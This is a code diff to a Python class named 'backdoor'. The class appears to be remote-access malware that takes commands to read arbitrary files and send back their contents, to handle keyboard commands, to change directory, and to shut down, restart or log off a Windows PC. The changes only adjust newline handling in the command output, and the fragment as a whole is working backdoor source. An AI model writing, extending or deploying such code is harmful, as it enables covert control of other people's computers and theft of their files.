@@ -61,8 +61,9 @@ class backdoor:
                     file = file.replace("'", "")
                     file = file.replace(" ", "")
                     try:
+                        output += file + "\n"
                         with open(file, "r") as r:
-                            output += r.read()
+                            output += r.read() + "\n"
                     except FileNotFoundError:
                         output += "FileNotFoundError: " + file + " does not exist\n"
             elif command.startswith("keyboard"):
@@ -81,7 +82,7 @@ class backdoor:
             elif command.startswith("cd"):
                 directory_to_change = command.split(" ")[1]
                 os.chdir(directory_to_change)
-                output += os.system("cd")
+                output += os.system("cd") + '\n'
             elif command.startswith("delay"):
                 delay_command = command.split("(")
                 time_to_delay = delay_command[1].replace(")", "")
@@ -93,11 +94,11 @@ class backdoor:
                 power_command_argument = power_command_argument.replace("'", "")
                 if power_command_argument.lower() == "shutdown":
                     os.system("shutdown /p")
-                    output += "Shutting down the pc"
+                    output += "Shutting down the pc\n"
                     continue
                 elif power_command_argument.lower() == "restart":
                     os.system("shutdown /r")
-                    output += "Restarting the pc"
+                    output += "Restarting the pc\n"
                     continue
                 elif power_command_argument.lower() == "sleep":
                     os.system("shutdown /l")
